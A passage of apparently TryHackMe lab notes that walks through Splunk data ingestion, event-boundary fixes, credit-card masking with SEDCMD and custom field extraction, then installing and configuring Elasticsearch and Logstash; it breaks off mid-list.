Let’s use python3 to run the file as shown below and see what output
we get:

python script

```
root@tryhackme:/opt/splunk/etc/apps/DataApp/bin# python3 samplelogs.py This is a sample log...

```

It seems, the script is ready. Note down the full path of the script file, that is
`/opt/splunk/etc/apps/DataApp/bin/samplelogs.py`, which we
will need later.

# Creating Inputs.conf

In the default directory, we will create all necessary
configuration files like inputs.conf, transform.conf, etc. For now, let’s create an inputs.conf using the command
`nano inputs.conf` add the following content into the file
and save.

```c
[script:///opt/splunk/etc/apps/DataApp/bin/samplelogs.py]
index = main
source = test_log
sourcetype = testing
interval = 5
```

The above configuration picks the output from the script
samplelogs.py and sends it to Splunk with the index `main`
every 5 seconds.

Restart Splunk using the command
`/opt/splunk/bin/splunk restart`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d8bef4883bc3cbd5d984af35a7fac2fe.gif](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d8bef4883bc3cbd5d984af35a7fac2fe.gif)

# Summary

So far, we have created a simple Splunk app, used the bin directory
to create a simple Python script, and then created inputs.conf file to
pick the output of the script and throw the output into Splunk in the
`main` index every 5 seconds. In the coming tasks, we will
work on the scripts that will generate some events that will have
visible parsing issues and then we will work with different
configuration files to fix those parsing issues.

**Event Boundaries - Understanding the problem**

Event breaking in Splunk refers to breaking raw data into individual
events based on specified boundaries. Splunk uses event-breaking rules
to identify where one event ends, and the next begins. Let’s walk
through an example using a sample log to understand how event breaking
works in Splunk.

**Understanding the Events**In this room, we will be working on the DataApp created in the
previous task and is placed at
`/opt/splunk/etc/apps/DataApp/`.

For this task, we will use the Python script `vpnlogs` from the `~/Downloads/scripts` directory, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/cff22b44aeec7afdc514ba75c54d2ca0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/cff22b44aeec7afdc514ba75c54d2ca0.png)

This directory contains various scripts, which we will explore later in this
room. For now, let’s focus on the vpnlogs script.

Let’s say our client has a custom VPN application that generates VPN logs
that contain information about the user, the VPN server, and the action
performed on the connection, as shown in the output below when we run the command `./vpnlogs`:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/2001736efc0579891f54074c86183f61.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/2001736efc0579891f54074c86183f61.png)

# Generating Events

Our first task is to configure Splunk to ingest these VPN logs. Copy the
vpnlogs script into the `bin` directory, open the
`inputs.conf` , and write these lines:

```c
[script:///opt/splunk/etc/apps/DataApp/bin/vpnlogs]
index = main
source = vpn
sourcetype = vpn_logs
interval = 5
```

The above lines tell Splunk to run the script `vpnlogs` every 5 seconds and send the output to the `main` index with
sourcetype `vpn_logs` and host value as
`vpn_server`. The `inputs.conf` file looks like this:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/00e16bbc970998b7872894014c86ae2a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/00e16bbc970998b7872894014c86ae2a.png)

# Restart Splunk

Save the file and restart Splunk using the command `/opt/splunk/bin/splunk
restart`. Open the Splunk instance at `10.10.149.128:8000`
and navigate to the search head.

# Search Head

Select the time range  `All time (Real-time)` and use the
following search query to see if we are getting the logs.**Search Query:** `index=main
sourcetype=vpn_logs`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c97efef3e9b75d0d388463d24f550dec.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c97efef3e9b75d0d388463d24f550dec.png)

**Identifying the problem**Excellent, we are getting the VPN logs after every 5 seconds. But can
you observe the problem? It's evident that Splunk cannot determine the
boundaries of each event and considers multiple events as a single
event.
By default, Splunk breaks the event
after carriage return.

### Fixing the Event Boundary

We need to fix the event boundary. To configure Splunk to break the events in this case, we have to make
some changes to the `props.conf` file. First, we will create
a regex to determine the end of the event. The sample events are shown
below:

**Sample Events**

```c
User: Emily Davis, Server: Server C, Action: DISCONNECT
User: John Doe, Server: Server B, Action: DISCONNECT
User: Bob Johnson, Server: Server B, Action: DISCONNECT
User: Emily Davis, Server: Server D, Action: CONNECT
User: Alice Smith, Server: Server D, Action: CONNECT
User: Alice Smith, Server: Server A, Action: DISCONNECT
User: Bob Johnson, Server: Server C, Action: DISCONNECT
User: John Doe, Server: Server D, Action: DISCONNECT
User: John Doe, Server: Server B, Action: DISCONNECT
User: Michael Brown, Server: Server E, Action: CONNECT
```

We will use [reg101.com](https://tryhackme.com/room/reg101.com) to create a regex pattern. If we look
closely, all events end with the terms `DISCONNECT` or
`CONNECT`. We can use this information to create a regex pattern
`(DISCONNECT|CONNECT)` , as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/45cd1d767436fc2f6287feaa4629df7f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/45cd1d767436fc2f6287feaa4629df7f.png)

Now, let’s create a `props.conf` in the default directory within the DataApp and
add the following lines:

```c
[vpn_logs]
SHOULD_LINEMERGE = true
MUST_BREAK_AFTER = (DISCONNECT|CONNECT)
```

This configuration tells Splunk to take the sourcetype to merge all lines and it **must
break** the events when you see the pattern matched in the
mentioned regex.

### Restart Splunk

Save the file and restart Splunk using the command `/opt/bin/splunk
restart`. Open the Splunk instance at `10.10.149.128:8000` and
navigate to the search head.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/dc6f01dab0ea4576b2bc4e4ad467d489.gif](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/dc6f01dab0ea4576b2bc4e4ad467d489.gif)

That’s it. We can see that with a few changes in the
`props.conf` file, we changed how Splunk broke these VPN logs
generated by the custom vpn_server.

**Parsing Muilt-line Events**

As we know, different log sources have their own ways of generating
logs. What if, a log source generates event logs that comprise of
multi-lines? One such example is Windows Event logs. In order to
understand how multi-line events can be handled in Splunk, we will use
the event logs generated from the script
`authentication_logs`. The sample event log is shown
below:

```c
[Authentication]:A login attempt was observed from the user Michael Brown and machine MAC_01
at: Mon Jul 17 08:10:12 2023 which belongs to the Custom department. The login attempt looks suspicious.
```

As it is clearly shown, the event contains multiple lines. Let’s
update the `inputs.conf` file to include this script and see if Splunk is
able to break the event as intended.

Copy the `authentication_logs` script from the `~/Downloads/scripts`
directory into the bin folder of the DataApp and add the following lines
in inputs.conf, save the file, and restart Splunk:

```c
[script:///opt/splunk/etc/apps/DataApp/bin/authentication_logs]
interval = 5
index = main
sourcetype= auth_logs
host = auth_server
```

### Search Head

Let’s look at the Splunk Search head to see how these logs are
reflected.

**Search Query**: `index=main sourcetype =
auth_logs`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b7636850f4a54323e16f28f8bc386c0b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b7636850f4a54323e16f28f8bc386c0b.png)

# Identifying the problem

If we observe the events, we will see that Splunk is breaking the 2-line
Event into 2 different events and is unable to determine the boundaries.

### Fixing the Event Boundary

In order to fix this issue, we can use different `stanzas` in
the `props.conf` file. If we run the script a few times to
observe the output, we can see that each event starts with the term
`[Authentication]`, indicating the start of the event. We can
use this as the regex pattern with the stanza
`BREAK_ONLY_BEFORE` and see if it could fix this problem.
Copy the following lines in `props.conf` file, save the file,
and then restart Splunk to apply changes.

```c
[auth_logs]
SHOULD_LINEMERGE = true
BREAK_ONLY_BEFORE = \[Authentication\]
```

### Search head

Go to Splunk Search head, and use the following search query.

**Search Query**: `index=main sourcetype =
auth_logs`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/6c37c54e87e0462c2d5fcd623d8ca762.gif](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/6c37c54e87e0462c2d5fcd623d8ca762.gif)

Great. See, now Splunk is able to break the event exactly how it was
intended.

**Masking Sensitive Data**

Masking sensitive fields, such as credit card numbers, is essential for
maintaining compliance with standards like PCI DSS (Payment Card
Industry Data Security Standard) and HIPAA (Health Insurance Portability
and Accountability Act). Splunk provides features like field masking and
anonymization to protect sensitive data. Here’s an example of credit
card numbers being populated in the Event logs generated by the script
`purchase-details` present in the `~/Downloads/scripts`
directory.

# Sample Output

```c
User William made a purchase with credit card 3714-4963-5398-4313.
User John Boy made a purchase with credit card 3530-1113-3330-0000.
User Alice Johnson made a purchase with credit card 6011-1234-5678-9012.
User David made a purchase with credit card 3530-1113-3330-0000.
User Bob Williams made a purchase with credit card 9876-5432-1098-7654.
```

Copy this script file into the bin folder of the DataApp and configure
the inputs.conf file to ingest these logs into Splunk. To do so, add the
following lines in the `inputs.conf` file.

```c
[script:///opt/splunk/etc/apps/DataApp/bin/purchase-details]
interval = 5
index = main
source = purchase_logs
sourcetype= purchase_logs
host = order_server
```

This configuration tells Splunk to get the output from the
`purchase-details` script, and index into the `main` index
every 5 seconds, with sourcetype  `purchase_logs` and host
as `order_server`. Now, save the file and restart Splunk. Log
on to Splunk and apply the following search query: **Search
Query**: `index=main sourcetype=purchase_logs`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/202289ab0e3fed8fd192daac9b78b0b6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/202289ab0e3fed8fd192daac9b78b0b6.png)

It looks like we have two problems to address. We need to hide the
credit card information that is being added to each event and also need
to fix the event boundaries.

# Fixing Event Boundaries

We will use `regex101.com` to create a regex pattern to
identify the end boundary of each event, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/3511419fee664679d298f20af2c52251.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/3511419fee664679d298f20af2c52251.png)

Let’s update the `props.conf`, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/4e5cd0b1370529864ae5c204b175931d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/4e5cd0b1370529864ae5c204b175931d.png)

Save the file, and restart Splunk. If everything goes well, the event
should be propagating correctly, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/20eb8179773eb23a52a255a34c633133.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/20eb8179773eb23a52a255a34c633133.png)

Now that we have fixed the event boundary issue. It’s time to mask the
sensitive information from the events.

# Introducing SEDCMD

In Splunk, the `sedcmd` configuration setting is used in
the `props.conf` file to modify or transform data during
indexing. It allows us to apply regular expression-based substitutions
on the incoming data before indexing it. The `sedcmd` setting
uses the syntax and functionality of the Unix `sed` command.

Here’s a brief explanation of how the `sedcmd` works in
`props.conf`:

1. Open the `props.conf` file in your Splunk configuration
directory.
2. Locate or create a stanza for the data source you want to modify.
3. Add the `sedcmd` setting under the stanza.
4. Specify the regular expression pattern and the replacement string using
the `s/` syntax similar to the `sed` command.

Here’s an example of using `sedcmd` in
`props.conf` to modify a field called `myField`:

```c
[source::/path/to/your/data]
SEDCMD-myField = s/oldValue/newValue/g
```

In this example, the `sedcmd` setting is applied to the data
from a specific source path. It uses the regular expression pattern
`oldValue` and replaces it globally with newValue using the g
flag in the `myField` field. This transformation occurs
before Splunk indexes the data.

It is important to note that, this `sedcmd` is just one of the
configuration settings `props.conf` used for data
transformation. There are other options available, such as
`REGEX`, `TRANSFORMS`, etc.

# Masking CC Information

Let’s now use the above knowledge gain to create a regex that replaces
the credit card number with something like this ->
`6011-XXXX-XXXX-XXXX.`, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/15c3a8ab96262801209a54fc9fb3cad8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/15c3a8ab96262801209a54fc9fb3cad8.png)

Now, our task is to use this
`s/OLD_VALUE>/<NEW_VALUE>/g` regex in sedcmd to
replace the credit card numbers with `XXXX-XXXX-XXXX`. The
final sedcmd value will become `s/-\d{4}-\d{4}-\d{4}/-XXXX-XXXX-XXXX/g`

Our configuration in the

```
props.conf
```

would look like this:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/9ab9690ecd51fd9d6f8e27c755068da3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/9ab9690ecd51fd9d6f8e27c755068da3.png)

Restart Splunk and check Splunk Instance to see how our changes are
reflected in the logs.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/f242295b6339d120bd6d5c9d6020557a.gif](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/f242295b6339d120bd6d5c9d6020557a.gif)

Great. With some changes in the configurations, we were able to mask the
sensitive information. As a SOC analyst, it is important to understand 
the criticality of masking sensitive information before being logged in 
order to comply with standards like HIPAA, PCI-DSS, etc.

Extracting Custom Fields

From a SOC analyst’s point of view, we would often encounter logs either
custom log sources, where not all fields are extracted by the SIEM
automatically, or we are required to extract custom fields to improve the
analysis. In that case, we need a way to extract custom fields from the
logs. To demonstrate this with an example, let’s go back to our vpn_logs
case. The output we are getting in Splunk is, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/6008fdcbe188a4daf5e2fe5a86792a42.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/6008fdcbe188a4daf5e2fe5a86792a42.png)

It's clear that none of the fields are extracted automatically, and we
can not perform any analysis on these events until fields like **username**,
**server**, and **action** are extracted.

# Extracting Username

Let’s first go through the process of extracting the usernames and
putting them under the field as **Username**, and then we
can follow the same steps to extract other fields as well.

# Creating Regex Pattern

Our first task would be to create a regex pattern to capture the username
values we are trying to capture. Sample event logs look like this:

```c
User: John Doe, Server: Server C, Action: CONNECT
User: John Doe, Server: Server A, Action: DISCONNECT
User: Emily Davis, Server: Server E, Action: CONNECT
User: Emily Davis, Server: Server D, Action: DISCONNECT
User: Michael Brown, Server: Server A, Action: CONNECT
User: Alice Smith, Server: Server C, Action: CONNECT
User: Emily Davis, Server: Server C, Action: DISCONNECT
User: John Doe, Server: Server C, Action: CONNECT
User: Michael Brown, Server: Server A, Action: DISCONNECT
User: John Doe, Server: Server D, Action: DISCONNECT
```

By creating a regex pattern as: `User:\s([\w\s]+)` and
creating a capturing group, we have successfully captured all the
usernames that we want to extract.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/651c0ef3e751e5224cf954b3baca2309.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/651c0ef3e751e5224cf954b3baca2309.png)

**Creating and Updating** `transforms.conf`

Now, let’s create a `transforms.conf` in the default
folder of the DataApp directory, and put the following configurations in it
as it is.

```c
[vpn_custom_fields]
REGEX = User:\s([\w\s]+)
FORMAT = Username::$1
WRITE_META = true
```

The `transforms.conf` would look like this:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/6e2802825fdbb9f2fb9945889f210a6e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/6e2802825fdbb9f2fb9945889f210a6e.png)

**Explanation:** We have created a
custom identifier `vpn_custom_fields`, used the regex pattern
to pull the usernames from the logs, mentioned the field name as Username,
and asked to capture the first group by referring to it as `$1`.
Save the configuration and move to the next step.

**Updating** `props.conf`

We need to update the props.conf to mention the recent updates we did
in transforms.conf. Here, we are appending the configuration for sourcetype **vpn_logs**
with the line `TRANSFORM-vpn = vpn_custom_fields`, as shown
below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5f1426cfe1335078ce43430856edeefc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5f1426cfe1335078ce43430856edeefc.png)

**Creating and Updating** `fields.conf`
****

The next step would be to create fields.conf and mention the field we are
going to extract from the logs, which is `Username`. `INDEXED
= true` means we are telling Splunk to extract this field at the indexed
time.

```c
[Username]
INDEXED = true
```

Fields.conf file would look like this:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/31a583a37218d90b754beaa9fb8a5323.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/31a583a37218d90b754beaa9fb8a5323.png)

# Restart Splunk

That’s all we need in order to extract the custom fields. Now,
restart the Splunk instance so that the changes we have made are
committed. Go to the Splunk instance and use the search query
`index=main sourcetype=vpn_logs`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/2f3cb792e75ebd502e65f96bd0111c8f.gif](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/2f3cb792e75ebd502e65f96bd0111c8f.gif)

This is it. With some changes to the
configuration files, we were able to extract a custom field from the
logs.

Let's use the same process and extract the remaining two fields as well.

# Creating Regex Pattern

This regex pattern `User:\s([\w\s]+),.+(Server.+),.+:\s(\w+)` captures all the three fields and places them into the groups, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d28ffd1ff8b2797de3e27aa5f7e7d42d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d28ffd1ff8b2797de3e27aa5f7e7d42d.png)

# Updating transforms.conf

Now that we have captured the fields that we want to extract, let's update the transforms.conf file, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/9c46fec97fef30117181e93ed589c382.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/9c46fec97fef30117181e93ed589c382.png)

In the configuration file, we have updated the **REGEX** pattern and the **FORMAT**, where we have specified different fields separating with a space.

# Updating fields.conf

Now it's time to update the fields.conf with the field names that we want Splunk to extract at index time.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5c52c5de7bb5b60eccfc27a995eaa8b6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5c52c5de7bb5b60eccfc27a995eaa8b6.png)

# Restart Splunk

As
 we have updated the configuration, we will need to restart Splunk for 
the changes to work. After restarting, go to the Splunk instance and use
 the search query `index=main sourcetype=vpn_logs`  to check the impact of the changes we made earlier.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/73d0639bb0a0c82c2debac1a86d10c86.gif](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/73d0639bb0a0c82c2debac1a86d10c86.gif)

## **ADVANCED ELK**

**LOGSTASH: DATA PROCESSING UNIT**

 Logstash is an open-source data processing engine that allows you to collect, enrich, and transform data from different sources. It is often used alongside other tools in the Elastic Stack, such as Elasticsearch and Kibana, to create a complete data processing and visualization pipeline. In this room, we will explore Logstash in-depth and how data from different sources can be ingested, parsed, normalized, and sent to various choice outputs. 

**Elasticsearch: Installation and Configuration**

### Elasticsearch

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c5a706e999df1b23f688ddeaa1d7c473.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c5a706e999df1b23f688ddeaa1d7c473.svg)

Elasticsearch is a distributed, open-source search and analytics
engine that allows you to store, search, and analyze large volumes of
data in real-time. It is built on top of Apache Lucene and provides a
scalable solution for full-text search, structured querying, and data
analysis.

In this room, we will use Elasticsearch to store data after being
filtered/normalized by Logstash. It’s important to know how to install
and configure Elasticsearch.

### Installing Elasticsearch

Let’s go through the process of installing Elasticsearch. The latest
installation instance is placed on the path
`/home/tools/elasticsearch`.

Elasticsearch Installation

```
analyst@tryhackme:/home/tools/elasticsearch# lselasticsearch.deb
```

Run the following command `dpkg -i elasticsearch.deb` as a
root user to install Elasticsearch on the lab. It will take
1-2 minutes to get installed, as shown below:

**Note:** Make sure to change the user to root using the
command `sudo su`

Elasticsearch Installation

```
root@tryhackme:/home/tools/elasticsearch# dpkg -i elasticsearch.deb Selecting previously unselected package elasticsearch.
(Reading database ... 319953 files and directories currently installed.)
Preparing to unpack elasticsearch.deb ...
Creating elasticsearch group... OK
Creating elasticsearch user... OK
Unpacking elasticsearch (8.8.0) ...
Setting up elasticsearch (8.8.0) ...
.................
Security autoconfiguration information...
.................
.................
NOT starting on installation, please execute the following statements to configure elasticsearch service to start automatically using systemd
 sudo systemctl daemon-reload
 sudo systemctl enable elasticsearch.service
### You can start elasticsearch service by executing sudo systemctl start elasticsearch.service

```

When installing for the first time, security configuration will be
displayed, including the default password for the elastic user; note
this down as it will be used later.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/1bcb00767a2585529eb8e2d05859e587.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/1bcb00767a2585529eb8e2d05859e587.png)

If all goes well, Elasticsearch will be installed on the host.

The following commands will be used to make the Elasticsearch service
persistent so that it gets started whenever the server restarts.

Elasticsearch: Persistence

```
root@tryhackme:/home/tools/elasticsearch# systemctl enable elasticsearch.serviceCreated symlink /etc/systemd/system/multi-user.target.wants/elasticsearch.service → /lib/systemd/system/elasticsearch.service.
root@tryhackme:/home/tools/elasticsearch# systemctl start elasticsearch.service
```

### Elasticsearch Status

Now that we have installed Elasticsearch successfully, let’s check its status to see if it's installed and running properly.

Elasticsearch: Status

```
root@tryhackme:/home/tools/elasticsearch# systemctl status elasticsearch.service● elasticsearch.service -Elasticsearch
     Loaded: loaded (/lib/systemd/system/elasticsearch.service; enabled; vendor preset: enabled)
     Active: active (running) since Wed 2023-06-07 05:51:33 UTC; 4min 33s ago
       Docs: https://www.elastic.co
   Main PID: 3389 (java)
      Tasks: 69 (limit: 4710)
     Memory: 2.3G
     CGroup: /system.slice/elasticsearch.service
             ├─3389 /usr/share/elasticsearch/jdk/bin/java -Xms4m -Xmx64m -XX:+UseSerialGC -Dcli.name=server -Dcli.script=/usr/share/elastic>
             ├─3465 /usr/share/elasticsearch/jdk/bin/java -Des.networkaddress.cache.ttl=60 -Des.networkaddress.cache.negative.ttl=10 -Djava>
             └─3485 /usr/share/elasticsearch/modules/x-pack-ml/platform/linux-x86_64/bin/controller
Jun 07 05:51:10 tryhackme systemd[1]: Starting Elasticsearch...
Jun 07 05:51:33 tryhackme systemd[1]: Started Elasticsearch.

```

This output shows the elasticsearch service has been successfully
installed and running properly.

**Configuring Elasticsearch**

We have
successfully installed Elasticsearch on the Linux host. We will now make
some changes to the configuration so that it’s accessible to other
components as well.

### Important Configurations

All important configuration files related to Elasticsearch can be found
in the

```
/etc/elasticsearch
```

directory.

Elasticsearch: Directory

```
root@tryhackme:/home/tools/elasticsearch#cd /etc/elasticsearch/root@tryhackme:/etc/elasticsearch# lscerts                              elasticsearch.keystore  jvm.options    log4j2.properties  roles.yml  users_roles
elasticsearch-plugins.example.yml  elasticsearch.yml       jvm.options.d  role_mapping.yml   users

```

Go to this directory and explore the files and directories. These are
important configuration files; some of them are explained below:

- `elasticsearch.yml`: This is the main configuration
file for Elasticsearch. It contains various settings that determine the
behavior of Elasticsearch, such as network configuration, cluster
settings, node settings, and paths for data storage and logging.
Modifying this file allows you to customize Elasticsearch according to
your specific requirements.
- `jvm.options`: The `jvm.options` file
contains JVM (Java Virtual Machine) configuration settings for
Elasticsearch. It allows you to specify parameters related to memory
allocation, garbage collection, and other JVM options. Adjusting these
settings is crucial for optimizing Elasticsearch’s performance and
ensuring efficient memory usage.
- `log4j2.properties`: The
`log4j2.properties` file is the configuration file for
Elasticsearch’s logging system, Log4j. It defines how Elasticsearch logs
different types of messages and sets log levels for different
components. You can modify this file to configure the log output format,
log rotation, and other logging-related settings.
- `users`: The `users` file is used for
configuring user authentication and authorization in Elasticsearch. It
allows you to define users, roles, and their respective permissions. By
managing this file, you can control access to Elasticsearch resources
and secure your cluster.
- `roles.yml` and `roles_mapping.yml`: These
files are used in conjunction with the `users` file to define
roles and their mappings to users and privileges. Roles provide a way to
group users and assign common permissions to them. The
`roles.yml` file defines the roles and their privileges,
while the `roles_mapping.yml` file maps roles to
users.

Let’s open the `elasticsearch.yml` using the command
`nano elasticsearch.yml` and go to the `Network`
section, as shown below:

```c
# ----------------------------------------------------- Network -------------------------------------------------------#
# By defaultElasticsearch is only accessible on localhost. Set a different# address here to expose this node on the network:  network.host: 127.0.0.1# By defaultElasticsearch listens forHTTP traffic on the first free port it# finds starting at 9200. Set a specificHTTP port here:  http.port: 9200 # For more information, consult the network module documentation.#
```

In this section, we see the two variables `network.host` and
`http.port`. Uncomment these two and change the value of the
`network.host` variable to `127.0.0.1` . As we are installing
all these components on the same host, therefore we will update the
`network.host` to `127.0.0.1`. Once these changes are made,
save the document and restart the Elasticsearch service using the following
command.

Elasticsearch: Restart

```
root@tryhackme:/home/tools/elasticsearch#systemctl restart elasticsearch.service
```

Now that we have installed and configured Elasticsearch properly, let's move on to the next task and install the Logstash component.

**Logstash: Installation and Configuration**

### Installing Logstash

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/06ace39a0a78144136599e037913a900.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/06ace39a0a78144136599e037913a900.svg)

Let’s go through the process of installing Logstash. The latest
installation instance is placed on the path
`/home/tools/logstash`.

Logstash

```
root@tryhackme:/home/tools/logstash# lslogstash.deb
```

Run the following command `dpkg -i logstash.deb` as a root
user to install the logstash on the server. It will take 1-2
minutes to get installed, as shown below:

Logstash Installation

```
root@tryhackme:/home/tools/logstash# dpkg -i logstash.deb Selecting previously unselected package logstash.
(Reading database ... 321412 files and directories currently installed.)
Preparing to unpack logstash.deb ...
Unpacking logstash (1:8.8.0-1) ...
Setting up logstash (1:8.8.0-1) ...
```

If all goes well, Logstash will be installed on the host.

**Logstash: Persistence**

We will use the following commands to make the
Logstash service persistent:

logstash: Persistence

```
root@tryhackme:/home/tools/logstash# systemctl daemon-reloadroot@tryhackme:/home/tools/logstash# systemctl enable logstash.serviceroot@tryhackme:/home/tools/logstash# systemctl start logstash.service
```

### Logstash Status

Now that we have installed Logstash successfully, let’s check its
status to see if it's installed and running properly.

Logstash: Status

```
root@tryhackme:/home/tools/logstash# systemctl status logstash.service● logstash.service - logstash
     Loaded: loaded (/lib/systemd/system/logstash.service; enabled; vendor pres>
     Active: active (running) since Wed 2023-06-07 18:29:12 UTC; 28s ago
   Main PID: 482871 (java)
      Tasks: 22 (limit: 4710)
     Memory: 280.7M
     CGroup: /system.slice/logstash.service
             └─482871 /usr/share/logstash/jdk/bin/java -Xms1g -Xmx1g -Djava.awt>

Jun 07 18:29:12 tryhackme systemd[1]: Stopped logstash.
Jun 07 18:29:12 tryhackme systemd[1]: Started logstash.
Jun 07 18:29:12 tryhackme logstash[482871]: Using bundled JDK: /usr/share/logst>
lines 1-12/12 (END)...skipping...
● logstash.service - logstash
     Loaded: loaded (/lib/systemd/system/logstash.service; enabled; vendor preset: enabled)
     Active: active (running) since Wed 2023-06-07 18:29:12 UTC; 28s ago
   Main PID: 482871 (java)
      Tasks: 22 (limit: 4710)
     Memory: 280.7M
     CGroup: /system.slice/logstash.service
             └─482871 /usr/share/logstash/jdk/bin/java -Xms1g -Xmx1g -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -XX:+HeapDumpOnOutOfMemoryError -Dja>

Jun 07 18:29:12 tryhackme systemd[1]: Stopped logstash.
Jun 07 18:29:12 tryhackme systemd[1]: Started logstash.
Jun 07 18:29:12 tryhackme logstash[482871]: Using bundled JDK: /usr/share/logstash/jdk
```

### Configuring Logstash

In a typical installation of Logstash, the `/etc/logstash`
directory is the default location for important configuration files.

logstash: Directory

```
root@tryhackme:/etc/logstash# lsconf.d  jvm.options  log4j2.properties  logstash-sample.conf  logstash.yml  pipelines.yml  startup.options
```

Here are some of the important files you may find in the
`/etc/logstash` directory:

- `logstash.yml`: This is the main configuration file
for Logstash. It contains global settings and options for Logstash, such
as network settings, logging configurations, pipeline configuration
paths, and more.
- `jvm.options`: This file contains the Java Virtual
Machine (JVM) options for Logstash. You can use it to configure
parameters like memory allocation, garbage collection settings, and
other JVM-related options.
- `log4j2.properties`: Logstash uses the Log4j2
framework for logging. This file allows you to configure the logging
behavior, including log levels, log outputs (such as console or file),
log file locations, and more.
- `pipelines.yml`: If you are running multiple pipelines
in Logstash, this file is used to define and configure them. It allows
you to specify each pipeline's different inputs, filters, and outputs.
- `conf.d/`: This directory is often used to store
individual pipeline configuration files. You can create separate
configuration files within this directory, each defining a specific data
processing pipeline. Logstash will load and process these configuration
files in alphabetical order, so it’s common to prefix them with numbers
to control the processing order.
- `patterns/`: This directory stores custom
